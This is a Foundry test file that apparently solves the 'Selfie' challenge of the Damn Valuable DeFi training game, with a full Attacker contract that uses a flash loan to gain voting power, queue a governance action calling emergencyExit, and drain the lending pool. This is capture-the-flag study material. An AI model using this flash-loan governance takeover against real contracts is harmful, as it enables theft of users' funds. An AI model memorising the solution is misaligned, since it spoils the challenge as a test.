// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DamnValuableTokenSnapshot} from "../../src/DamnValuableTokenSnapshot.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieTest is Test {
    SimpleGovernance private governance;
    SelfiePool private pool;
    DamnValuableTokenSnapshot private token;
    Attacker private attacker;
    address private player;
    uint256 private constant POOL_INITIAL_BALANCE = 1_500_000e18;
    uint256 private constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;

    function setUp() public {
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(token));
        assertEq(governance.getActionCounter(), 1);
        pool = new SelfiePool(address(token), address(governance));
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        token.transfer(address(pool), POOL_INITIAL_BALANCE);
        token.snapshot();
        player = makeAddr("player");
        vm.startPrank(player);
        attacker = new Attacker(address(governance), address(pool), address(token));
        vm.stopPrank();

        assertEq(token.balanceOf(address(pool)), POOL_INITIAL_BALANCE);
        assertEq(pool.maxFlashLoan(address(token)), POOL_INITIAL_BALANCE);
        assertEq(pool.flashFee(address(token), 0), 0);
        assertEq(token.balanceOf(address(player)), 0);
    }

    function testAttack() public {
        // Exploit code:
        vm.startPrank(player);
        attacker.queueAttack();
        vm.warp(governance.getActionDelay() + 1);
        attacker.executeAttack();
        vm.stopPrank();
        //
        validate();
    }

    function validate() public {
        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(token.balanceOf(address(player)), POOL_INITIAL_BALANCE);
    }
}

// Attacker contract the malicious actor would deploy:
contract Attacker is IERC3156FlashBorrower {
    address private governance;
    address private selfiePool;
    address private token;
    address private owner;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 private actionId;

    constructor(address _governance, address _pool, address _token) {
        governance = _governance;
        selfiePool = _pool;
        token = _token;
        owner = msg.sender;
    }

    function executeAttack() public {
        require(msg.sender == owner);
        SimpleGovernance gov = SimpleGovernance(governance);
        gov.executeAction(actionId);
    }

    function queueAttack() public {
        require(msg.sender == owner);
        SelfiePool pool = SelfiePool(selfiePool);
        uint256 amount = pool.maxFlashLoan(token);
        pool.flashLoan(this, token, amount, abi.encodeWithSelector(pool.emergencyExit.selector, owner));
    }

    function onFlashLoan(address, address _token, uint256 amount, uint256, bytes calldata data)
        external
        returns (bytes32)
    {
        DamnValuableTokenSnapshot(_token).snapshot();
        SimpleGovernance gov = SimpleGovernance(governance);
        actionId = gov.queueAction(selfiePool, 0, data);

        DamnValuableTokenSnapshot(_token).approve(msg.sender, amount);
        return CALLBACK_SUCCESS;
    }
}
